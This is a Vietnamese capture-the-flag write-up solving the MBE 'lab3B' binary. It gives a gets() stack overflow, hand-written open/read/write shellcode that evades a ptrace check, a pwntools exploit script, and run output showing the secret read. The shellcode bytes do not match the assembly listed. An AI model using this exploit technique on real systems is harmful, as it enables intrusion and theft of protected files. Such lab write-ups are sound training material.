# Problem
`lab3B` này là 1 dạng mới mình từng gặp, bài này sẽ gọi một tiến trình con bằng hàm fork(): 
```sh
pid_t child = fork();
```

Bài này chúng ta có `hint` trong source luôn:

```sh
/* hint: write shellcode that opens and reads the .pass file.
   ptrace() is meant to deter you from using /bin/sh shellcode */

```

Bài này có sử dụng 1 số hàm chính như:

* ptrace(PTRACE_TRACEME, 0, NULL, NULL);     - cái này trên hint có rồi nhỉ.
* puts("just give me some shellcode, k");    - hiển thị chuỗi ra màn hình
* gets(buffer);                              - Nhập dữ liệu từ bàn phím, đây là hàm gây Buffer Overflow vì không kiểm soát số lượng nhập vào.
* wait(&status);                             - Đợi tiến trình, cụ thể là tiến trình con thực hiện, theo mình hiểu là vậy :v.
* syscall = ptrace(PTRACE_PEEKUSER, child, 4 * ORIG_EAX, NULL); - hàm này sẽ ngăn tiến trình con spawn shell.


# Solution

### Lý thuyết
Hướng exploit bài này là mình sẽ viết shellcode thực hiện các chức năng như open, read, write đúng như hint ở trên.
sau đó mình sẽ ret về shellcode ấy.

### Thực hành
Nghe lý thuyết thì có vẻ ăn ngay và luôn. mình cùng thực hành nào.

Để viết shellcode chúng ta cần rất nhiều thứ như sau:

* đường dẫn file cần mở  - Chắc chắn rồi, nó giống như flag, đọc được nó coi như mình làm xong bài này.
* hết rồi. :v

Đường dẫn thì nó là `.pass` luôn vì hint có nói thế. Để nó vào shellcode thì chúng ta cần phải chuyển sang hexa

```sh
.   p    a   s   s                        s  a  p  .     s
2e  70   61  73  73             =>        73 61 70 2e    73
```

Đảo ngược nó là vì shellcode chuỗi này mình đưa vào stack có kết thúc nhỏ. (little endian)

Shellcode mình viết bằng asembly như sau:
```sh
    segment .text
        global _start
    _start:
    push   0x73
    push   0x7361702e

    xor    eax,eax
    mov    al,0x5    ; Sys_open
    mov    ebx,esp
    xor    ecx,ecx
    xor    edx,edx
    int    0x80

    sub    esp,0x64
    mov    ebx,eax
    mov    al,0x3     ; Sys_read
    mov    ecx,esp
    mov    dl,0x64
    int    0x80

    mov    al,0x4     ; Sys_write
    mov    bl,0x1       
    mov    ecx,esp
    mov    dl,0x64
    int    0x80
```


**sub esp,0x64** là mình để chứa giá trị trong file trên. 

Sau khi chuyển sang shellcode sẽ như này: 
```sh
 shellcode = "\x6a\x73\x68\x2e\x70\x61\x73\x68\x62\x33\x41\x2f\x68\x65\x2f\x6c\x61\x68\x2f\x68\x6f\x6d\x31\xc0\xb0\x05\x89\xe3\x31\xc9\x31\xd2\xcd\x80\x83\xec\x64\x89\xc3\xb0\x03\x89\xe1\xb2\x64\xcd\x80\xb0\x04\xb3\x01\x89\xe1\xb2\x64\xcd\x80"

```
Và đây là file exploit3B.py của mình

```sh
from pwn import *

s = process("./lab3B")
elf = ELF("./lab3B")
LIBC = ELF("/lib/i386-linux-gnu/libc.so.6")
raw_input("DEBUG")
payload = 'a'.ljust(156,"b")
payload+= p32(elf.symbols.plt['gets'])
#cach1
#payload+= p32(elf.symbols['main'])
#cach2
payload+= p32(0x8049000)
payload+= p32(0x8049000)
s.sendline(payload)

shellcode = "\x6a\x73\x68\x2e\x70\x61\x73\x68\x62\x33\x41\x2f\x68\x65\x2f\x6c\x61\x68\x2f\x68\x6f\x6d\x31\xc0\xb0\x05\x89\xe3\x31\xc9\x31\xd2\xcd\x80\x83\xec\x64\x89\xc3\xb0\x03\x89\xe1\xb2\x64\xcd\x80\xb0\x04\xb3\x01\x89\xe1\xb2\x64\xcd\x80"
s.sendline(shellcode)
s.interactive()
s.close()
```
Chạy file exploit3B.py và lấy secret_message.
```sh
zir@warzone:~/ctf/TrainingPwn/MBE_release/levels/lab03$ python exploit3B.py
[+] Starting local process './lab3B': pid 12291
[*] '/home/zir/ctf/TrainingPwn/MBE_release/levels/lab03/lab3B'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[*] '/lib/i386-linux-gnu/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
DEBUG
[*] Switching to interactive mode
just give me some shellcode, k
secret_content
\x00bbbbbbbbbbbbbbbbbbb\x0c���\x15��\xff\xff\xff\x7f
\x00\x00\x00\x00bbbbbbbbbbbbbbbbbbbbbbb\x00\x04bbbbbbbbbbbb$  
```

